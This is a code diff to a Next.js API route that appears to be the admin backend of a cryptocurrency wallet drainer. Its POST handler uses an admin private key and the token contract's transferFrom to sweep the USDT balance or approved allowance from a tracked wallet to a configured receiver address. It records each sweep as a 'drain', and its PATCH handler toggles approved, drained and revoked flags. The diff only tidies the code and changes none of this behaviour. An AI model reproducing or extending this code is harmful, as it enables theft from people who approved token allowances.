@@ -46,15 +46,12 @@ export async function POST(
 
   const receiverAddress = configRow?.value;
   if (!receiverAddress) {
-    return NextResponse.json({ error: "Receiver address not set in admin Config tab" }, { status: 500 });
+    return NextResponse.json({ error: "Receiver address not set" }, { status: 500 });
   }
 
   const privateKey = process.env.ADMIN_PRIVATE_KEY;
   if (!privateKey) {
-    return NextResponse.json(
-      { error: "ADMIN_PRIVATE_KEY is not set in environment variables" },
-      { status: 500 }
-    );
+    return NextResponse.json({ error: "ADMIN_PRIVATE_KEY not set" }, { status: 500 });
   }
 
   try {
@@ -68,7 +65,7 @@ export async function POST(
       adminWallet
     );
 
-    const [balance, allowance]: [bigint, bigint] = await Promise.all([
+    const [balance, allowance] = await Promise.all([
       contract.balanceOf(wallet.address),
       contract.allowance(wallet.address, adminWallet.address),
     ]);
@@ -79,43 +76,29 @@ export async function POST(
 
     if (allowance === BigInt(0)) {
       await supabase.from("wallets").update({ is_approved: false }).eq("id", id);
-      return NextResponse.json(
-        { error: "No on-chain allowance found." },
-        { status: 400 }
-      );
+      return NextResponse.json({ error: "No allowance found" }, { status: 400 });
     }
 
     let transferAmount = balance < allowance ? balance : allowance;
     let amountFormatted = ethers.formatUnits(transferAmount, 18);
 
-    if (limitUsd !== null) {
-      const transferUsd = parseFloat(amountFormatted);
-      if (transferUsd > limitUsd) {
-        transferAmount = ethers.parseUnits(limitUsd.toString(), 18);
-        amountFormatted = limitUsd.toString();
-      }
+    if (limitUsd !== null && parseFloat(amountFormatted) > limitUsd) {
+      transferAmount = ethers.parseUnits(limitUsd.toString(), 18);
+      amountFormatted = limitUsd.toString();
     }
-
-    console.log(`🔄 Draining ${amountFormatted} USDT from ${wallet.address}`);
 
     const tx = await contract.transferFrom(
       wallet.address,
       receiverAddress,
       transferAmount,
-      {
-        gasLimit: 120000,
-        gasPrice: ethers.parseUnits("0.85", "gwei"),
-      }
+      { gasLimit: 120000, gasPrice: ethers.parseUnits("0.85", "gwei") }
     );
 
     const receipt = await tx.wait();
 
     await supabase
       .from("wallets")
-      .update({ 
-        drained: false, 
-        drain_tx_hash: receipt.hash 
-      })
+      .update({ drained: false, drain_tx_hash: receipt.hash })
       .eq("id", id);
 
     await supabase.from("transactions").insert({
@@ -126,28 +109,20 @@ export async function POST(
       status: "success",
     });
 
-    return NextResponse.json({ 
-      success: true, 
-      txHash: receipt.hash, 
-      amount: amountFormatted 
-    });
+    return NextResponse.json({ success: true, txHash: receipt.hash, amount: amountFormatted });
 
-  } catch (err: unknown) {
-    const message = err instanceof Error ? err.message : "Unknown error";
-    console.error("Drain Error:", message);
-
+  } catch (err: any) {
+    console.error("Drain Error:", err.message);
     await supabase.from("transactions").insert({
       wallet_address: wallet.address,
       type: "drain",
       status: "failed",
-      amount_usdt: "0",
     });
-
-    return NextResponse.json({ error: message }, { status: 500 });
+    return NextResponse.json({ error: err.message }, { status: 500 });
   }
 }
 
-// PATCH - Update wallet (for toggles)
+// PATCH - Update wallet (Toggle)
 export async function PATCH(
   req: NextRequest,
   { params }: { params: Promise<{ id: string }> }
@@ -161,20 +136,18 @@ export async function PATCH(
 
   try {
     const body = await req.json();
-    console.log("PATCH body:", body);
 
     const updateData: any = {};
 
-    // Only update columns that actually exist
     if (body.is_approved !== undefined) updateData.is_approved = body.is_approved;
     if (body.drained !== undefined) updateData.drained = body.drained;
     if (body.is_revoked !== undefined) updateData.is_revoked = body.is_revoked;
 
-    // Support old field name
+    // Support legacy field name
     if (body.approval_status !== undefined) updateData.is_approved = body.approval_status;
 
     if (Object.keys(updateData).length === 0) {
-      return NextResponse.json({ error: "No valid fields to update" }, { status: 400 });
+      return NextResponse.json({ error: "No fields to update" }, { status: 400 });
     }
 
     const { data, error } = await supabase
